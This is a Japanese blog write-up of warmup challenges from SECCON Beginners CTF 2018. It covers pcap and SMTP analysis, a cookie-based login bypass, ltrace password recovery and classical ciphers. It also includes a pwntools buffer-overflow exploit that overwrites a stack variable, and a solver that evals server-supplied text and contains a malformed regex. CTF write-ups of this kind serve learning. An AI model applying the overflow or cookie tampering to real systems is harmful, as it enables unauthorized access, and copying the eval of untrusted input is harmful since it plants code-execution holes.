---
title: "SECCON Beginners CTF 2018に参加した"
date: 2018-05-27T00:00:00+09:00
draft: false
---

SECCON Beginners CTF 2018に個人で参加した．
CTF力が圧倒的に足りず，Warmupくらいしか解けなかった．

## [Warmup] plain mail
pcapファイルの解析．
問題文を見るとわかるように，pcapの中身を見るとSMTPの通信が多い．
加えて，それらの通信には暗号化が施されていないため，平文で中身を見ることができる．

というわけで，真面目にpcapファイルを見てもよいが，面倒なので `strings` コマンドで文字列を見てみる．
すると，下記のように `encrypted.zip` というファイルをBase64エンコードして送信している箇所がある．

    354 Enter message, ending with "." on a line by itself
    kContent-Type: multipart/mixed; boundary="===============0309142026791669022=="
    MIME-Version: 1.0
    Content-Disposition: attachment; filename="encrypted.zip"
    --===============0309142026791669022==
    Content-Type: application/octet-stream; Name="encrypted.zip"
    MIME-Version: 1.0
    Content-Transfer-Encoding: base64
    UEsDBAoACQAAAOJVm0zEdBgeLQAAACEAAAAIABwAZmxhZy50eHRVVAkAA6f/4lqn/+JadXgLAAEE
    AAAAAAQAAAAASsSD0p8jUFIaCtIY0yp4JcP9Nha32VYd2BSwNTG83tIdZyU4x2VJTGyLcFquUEsH
    CMR0GB4tAAAAIQAAAFBLAQIeAwoACQAAAOJVm0zEdBgeLQAAACEAAAAIABgAAAAAAAEAAACkgQAA
    AABmbGFnLnR4dFVUBQADp//iWnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE4AAAB/AAAAAAA=
    --===============0309142026791669022==--

明らかに怪しいので，とりあえずこれを復元してみる．
Base64エンコードされている文字列のみを持ってきて，それをPythonでデコード，ファイルへの書き込みを行う．

    import base64

    encoded = 'UEsDBAoACQAAAOJVm0zEdBgeLQAAACEAAAAIABwAZmxhZy50eHRVVAkAA6f/4lqn/+JadXgLAAEEAAAAAAQAAAAASsSD0p8jUFIaCtIY0yp4JcP9Nha32VYd2BSwNTG83tIdZyU4x2VJTGyLcFquUEsHCMR0GB4tAAAAIQAAAFBLAQIeAwoACQAAAOJVm0zEdBgeLQAAACEAAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQADp//iWnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE4AAAB/AAAAAAA='

    with open('encripted.zip', 'wb') as f:
        f.write(base64.b64decode(encoded))

これを実行すると，zipファイルが復元される．
復元されたzipファイルを解凍しようとすると，パスワードが求められる．
メールの中にそれっぽい文字列がないかと探していると，先程のBase64データのあとに送られているメールの中に怪しいものがある．

    mail FROM:<me@4b.local> size=13
     250 OK
    rcpt TO:<you@4b.local>
    !250 Accepted
    data
    !354 Enter message, ending with "." on a line by itself
    _you_are_pro_

ためしに `_you_are_pro_` をパスワードとして解凍してみると，うまく解凍できて， `flag.txt` というファイルが出てくる．
その内容がフラグとなっている．

    $ cat flag.txt
    ctf4b{email_with_encrypted_file}

Flag: `ctf4b{email_with_encrypted_file}`

## [Warmup] Greeting
提示されているWebページに行くと，ユーザ名を入力するフォームと，ページのPHPソースが表示されている．
PHPのソースを読むと， `username` という変数の内容が `admin` であったらフラグが表示されるようになっている．
`username` はフォームに名前を入力することで変更できるが， `admin` を入力すると `偽管理者` に変更されるようになっているため，フォームからは `username` を `admin` に設定することができない．

しかし，ソースをよく見ると，POSTで `name` を送信していない場合はCookieの中にある `name` を参照するようになっている．
さらに，Cookieで `name` を `admin` に設定した場合は `偽管理者` に変更されるようなロジックは実装されていない．
そのため，POSTで何も送らず，Cookieの `name` に `admin` を設定してページにアクセスするとフラグをゲットできる．

Flag: `ctf4b{w3lc0m3_TO_ctf4b_w3b_w0rd!!}`

## [Warmup] Simple Auth
ダウンロードしたバイナリを実行してみると，パスワードが求められる．
入力したパスワードが正しければFlagが表示されそうな感じ．
`strcmp` 等で判定しているのでは，と予想して， `ltrace` コマンドを使って実行してみる．
すると，入力した文字列と `ctf4b{rev3rsing_p4ssw0rd}` の文字列を求めている箇所が見つかる．
これらの文字列長が等しければFlagが表示されるように推測できるので，同じ文字列を与えてあげる．
すると，Flagが表示される（さっき見つけた文字列と同じ）．

    $ ltrace ./simple_auth
    ...
    strlen("aiueo")                                                                        = 5
    strlen("ctf4b{rev3rsing_p4ssw0rd}")                                                    = 25
    ...

    $ ./simple_auth
    Input Password: ctf4b{rev3rsing_p4ssw0rd}
    Auth complite!!
    Flag is ctf4b{rev3rsing_p4ssw0rd}

Flag: `ctf4b{rev3rsing_p4ssw0rd}`

## [Warmup] condition
バイナリを実行してみると，名前の入力を求められる．
`strace` や `ltrace` でみても大した情報は得られなかったので， `objdump` でmainの部分を見てみる．

アセンブリを見てみると， `0x40079b` で `gets` 関数を呼び出し，標準入力から受け取った文字列を `rbp-0x30` に格納している．
その後， `cmp` で `rbp-0x4` に入っている文字列と `0xdeadbeef` とを比較し，等しい場合のみその先にある `read_file` 関数を実行している．
`read_file` の中身を見ると，この中でファイルオープンと標準出力への書き込みを行っているようである．

`rbp-0x4` に `0xdeadbeef` を格納するには， `0x30 - 0x4 = 44` 個のパディングを先に入力し，その後に `0xdeadbeef` を書き込んであげれば良い．
これらをもとに，フラグを得るためのプログラムを作成する．

    # -*- coding: utf-8 -*-

    from pwn import *

    string = 'deadbeef'
    sendmsg = 'a' * 44 + '\xef\xbe\xad\xde' + '\n'

    host = 'pwn1.chall.beginners.seccon.jp'
    port = 16268
    c = remote(host, port)

    c.recvuntil('Please tell me your name...')
    c.send(sendmsg)
    print(c.recv())
    print(c.recv())

これを実行すると，フラグをゲットできる．

    $ python solve.py
    [+] Opening connection to pwn1.chall.beginners.seccon.jp on port 16268: Done
    OK! You have permission to get flag!!

    ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}

    [*] Closed connection to pwn1.chall.beginners.seccon.jp port 16268

## [Warmup] Veni, vidi, vici
ダウンロードしたzipファイルを解凍すると，part1からpart3までのファイルが入っている．
中身を見てみると，part1とpart2はそれぞれ何らかの暗号で暗号化されている．

part1は，ROT13で暗号化されているようなので，Pythonで復号する．

    # -*- coding: utf-8 -*-

    import codecs

    with open('veni_vidi_vici/part1', 'r') as f:
        text = f.read().strip()

    print(codecs.decode(text, 'rot13'))

part2は，それぞれの文字が8個ずつずれているので，これもPythonで復号．

    # -*- coding: utf-8 -*-

    import string


    with open('veni_vidi_vici/part2', 'r') as f:
        text = f.read().strip()

    for c in text:
        if c in string.ascii_lowercase:
            plain = chr((ord(c) - ord('a') + 8) % 26 + ord('a'))
        elif c in string.ascii_uppercase:
            plain = chr((ord(c) - ord('A') + 8) % 26 + ord('A'))
        else:
            plain = c

        print(plain, end='')
    print()

part3は，Unicodeを使って(?)すべての文字が上下逆さまになっている．
なので，普通に目で読む．

これらを結合するとFlagとなる．

Flag: `ctf4b{n0more_cLass!cal_cRypt0graphy}`

## bbs

* バイナリを実行すると，文字列の入力を求められる．
* 何らかの文字列を入力すると，現在時刻とともに先程入力した内容が表示され，プログラムが終了する．
* 試しに長い文字列を入力すると，Segmentation Faultが発生する．
* Segmentation Faultがおこらないギリギリの長さを探すと，135文字までは正常に入力が受け付けられることがわかる
    * 改行文字を含めて136文字目？
* checksec.shを使ってバイナリ情報を確認すると，Stack Canaryがない事がわかる
    * Stack Overflowができそう

```
$ checksec --file ./bbs
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No      0               4       ./bbs
```

* 結局解けていない

## てけいさんえくすとりーむず
とりあえずncで接続してみると，ひたすら計算をしていくだけのよう．
おそらくすべての問題を解けたらFlagが貰えそうなので，雑にプログラムを書いて実行する．

```
# -*- coding: utf-8 -*-

import re
from pwn import *


host = 'tekeisan-ekusutoriim.chall.beginners.seccon.jp'
port = 8690

c = remote(host, port)

for i in xrange(11):
    c.readline()

regex = re.compile(r'^\(Stage.\d+\))

while True:
    string = c.readline().strip()

    if regex.match(string):
        print string
        problem = c.readuntil('=').split('=')[0]
        print problem
        answer = eval(problem)
        print(answer)
        c.send(str(answer) + '\n')
    else:
        print c.read()
```

これを実行するとFlagがもらえた．

```
$ python solve.py
[+] Opening connection to tekeisan-ekusutoriim.chall.beginners.seccon.jp on port 8690: Done
(Stage.1)
708 + 910
1618
...
Flag is: "ctf4b{ekusutori-mu>tekeisann>bigina-zu>2018}"
```

Flag: `ctf4b{ekusutori-mu>tekeisann>bigina-zu>2018}`
